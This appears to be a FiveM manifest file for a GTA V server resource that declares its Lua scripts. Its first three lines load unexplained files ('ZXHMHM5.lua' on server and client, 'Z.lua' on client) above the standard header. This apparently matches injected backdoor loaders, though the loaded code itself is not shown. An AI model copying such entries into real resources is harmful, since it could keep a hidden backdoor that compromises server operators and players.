server_script "ZXHMHM5.lua"
client_script "ZXHMHM5.lua"
client_script "Z.lua"
game("gta5")
fx_version("cerulean")
client_script("@mythic-base/components/cl_error.lua")
client_script("@mythic-pwnzor/client/check.lua")

lua54("yes")

client_scripts({
	"shared/**/*.lua",
	"client/**/*.lua",
})

server_scripts({
	"shared/**/*.lua",
	"server/**/*.lua",
})
